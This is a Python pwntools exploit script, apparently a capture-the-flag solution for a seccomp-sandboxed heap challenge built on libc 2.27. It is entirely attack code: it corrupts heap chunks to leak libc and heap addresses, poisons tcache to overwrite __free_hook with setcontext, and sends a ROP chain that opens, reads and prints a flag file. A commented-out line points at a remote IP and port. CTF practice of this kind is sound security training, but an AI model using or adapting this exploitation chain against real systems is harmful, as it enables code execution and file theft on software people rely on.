from pwn import*
#r=remote('101.201.71.136', 32999)
r=process('./start.sh')
#r=process('./sandboxheap')
context(os="linux",arch="amd64",log_level='debug')

libc=ELF("./libc-2.27.so")

def new(idx,size):
	r.recvuntil(": ")
	r.sendline("1")
	r.recvuntil(": ")
	r.sendline(str(idx))
	r.recvuntil(": ")
	r.sendline(str(size))
	
def edit(idx,content):
	r.recvuntil(": ")
	r.sendline("2")
	r.recvuntil(": ")
	r.sendline(str(idx))
	r.recvuntil(": ")
	r.send(content)

def show(idx):
	r.recvuntil(": ")
	r.sendline("3")
	r.recvuntil(": ")
	r.sendline(str(idx))
	
def delete(idx):
	r.recvuntil(": ")
	r.sendline("4")
	r.recvuntil(": ")
	r.sendline(str(idx))	
	
def encode(num):
	return bin(num)[2:].rjust(0x8,"0")[::-1]
	
def encode64(num):
	result=""
	for i in range(8):
		result+=encode(num%0x100)
		num=num//0x100
	return result
	
for i in range(10): new(i,0xA8)

for i in range(3,10): delete(i)

delete(0)

edit(1,encode(0)*0xA0+encode64(0x160)+"\x00")

delete(2)

for i in range(3,10): new(i,0xA8)

new(0,0xA8)

show(1)

r.recvuntil(": ")
libc_base=u64(r.recv(6)+p16(0))-libc.sym["__malloc_hook"]-0x70
success("libc_base: "+hex(libc_base))

pop_rdi=libc_base+0x2164f
pop_rsi=libc_base+0x23a6a
pop_rdx=libc_base+0x1b96
pop_rax=libc_base+0x1b500
syscall=libc_base+libc.sym["time"]-11

new(11,0xA8)
new(2,0xA8)

delete(3)
delete(11)

show(1)

r.recvuntil(": ")
heap=u64(r.recv(6)+p16(0))-0x890
success("heap: "+hex(heap))

edit(1,encode64(libc_base+libc.sym["__free_hook"]))

new(12,0xA8)
new(3,0xA8)

edit(3,encode64(libc_base+libc.sym["setcontext"]+53))


new(13, 0x80)
new(14, 0x80)
payload = ''
payload+=encode64(pop_rdi)
payload+=encode64(0x3)
payload+=encode64(pop_rax)
payload+=encode64(0x2710)
payload+=encode64(syscall)
payload+=encode64(libc_base+libc.sym["getchar"])
payload+=encode64(pop_rdi)
payload+=encode64(heap + 0x2000)
payload+=encode64(libc_base+libc.sym["gets"])
payload+=encode64(libc_base+0x000000000000396c) + encode64(heap + 0x2000)
edit(13,payload)

payload = encode64(0x67616c662f2e)*2 + encode64(heap+0x940) + encode64(pop_rdi+1)
edit(14, payload)

#gdb.attach(r,"b *"+str(libc_base+libc.sym["setcontext"]+53))
#pause()

delete(13)
sleep(1)

payload= b''
payload+= p64(pop_rdi) + p64(heap+0x9d0)
payload+= p64(pop_rsi) + p64(0)
payload+= p64(pop_rdx) + p64(0)
payload+= p64(pop_rax) + p64(2)
payload+= p64(syscall)

payload+= p64(pop_rdi) + p64(3)
payload+= p64(pop_rsi) + p64(heap+0x3000)
payload+= p64(pop_rdx) + p64(0x100)
payload+= p64(pop_rax) + p64(0)
payload+= p64(syscall)

payload+= p64(pop_rdi) + p64(1)
payload+= p64(pop_rsi) + p64(heap+0x3000)
payload+= p64(pop_rdx) + p64(0x100)
payload+= p64(pop_rax) + p64(1)
payload+= p64(syscall)

sleep(1)

r.sendline(payload)

r.interactive()
